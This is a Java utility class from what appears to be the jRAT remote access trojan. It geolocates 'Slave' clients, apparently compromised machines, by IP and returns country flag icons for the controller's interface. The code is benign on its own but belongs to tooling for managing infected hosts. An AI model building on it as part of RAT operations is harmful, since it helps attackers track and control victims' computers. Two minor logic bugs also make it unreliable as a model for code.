package pro.jrat.utils;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Random;

import javax.swing.ImageIcon;

import pro.jrat.Main;
import pro.jrat.Slave;
import pro.jrat.ip2c.Country;
import pro.jrat.ip2c.IP2Country;


public class FlagUtils {

	public static final HashMap<String, ImageIcon> flags = new HashMap<String, ImageIcon>();
	
	private static IP2Country ip2c;

	static {
		try {
			ip2c = new IP2Country("files/db.dat", IP2Country.MEMORY_MAPPED);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	public static Country getCountry(Slave s) {
		return getCountry(s.getRawIP());
	}
	
	public static Country getCountry(String ip) {
		Country country = null;
		
		try {
			country = ip2c.getCountry(ip);
		} catch (Exception ex) {
			ex.printStackTrace();
		}
		
		return country;
	}
	
	public static ImageIcon getFlag(Slave s) {
		return FlagUtils.getFlag(s.getCountry());
	}

	public static ImageIcon getFlag(String name) {
		name = name.trim().toLowerCase();
	
		ImageIcon icon = null;
	
		try {
			if (name.equals("Unknown")) {
				throw new Exception("Skip to error flag");
			}
			if (flags.containsKey(name)) {
				icon = flags.get(name);
			} else {
				icon = new ImageIcon(Main.class.getResource("/flags/" + name + ".png"));
				flags.put(name, icon);
			}
	
		} catch (Exception e) {
			if (flags.containsKey("errorflag")) {
				icon = flags.get("errorflag");
			} else {
				icon = new ImageIcon(Main.class.getResource("/icons/errorflag.png"));
				flags.put("errorflag", icon);
			}
		}
		return icon;
	}

	public static ImageIcon getRandomFlag() {
		List<String> list = new ArrayList<String>();
		list.add("blue");
		list.add("red");
		list.add("orange");
		list.add("white");
		list.add("green");
		int index = (new Random()).nextInt(list.size() - 1);
		return IconUtils.getIcon("flag_" + list.get(index), true);
	}
	
}